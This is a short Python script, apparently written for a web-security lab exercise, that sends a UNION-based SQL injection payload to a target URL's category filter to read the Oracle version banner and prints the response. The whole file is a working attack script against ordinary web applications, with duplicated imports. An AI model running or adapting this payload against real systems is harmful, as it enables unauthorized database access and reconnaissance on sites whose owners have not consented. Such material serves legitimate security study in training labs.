import requests
import sys

import requests
import sys

if __name__ == "__main__":
    if len(sys.argv) != 2:
        print("Usage: python3 script.py <url>")
        sys.exit(1)


burp_url = sys.argv[1]+"/filter?category=' UNION SELECT BANNER, NULL FROM v$version--"
burp_headers = {}
r = requests.get(burp_url, headers=burp_headers)
print(r.text)
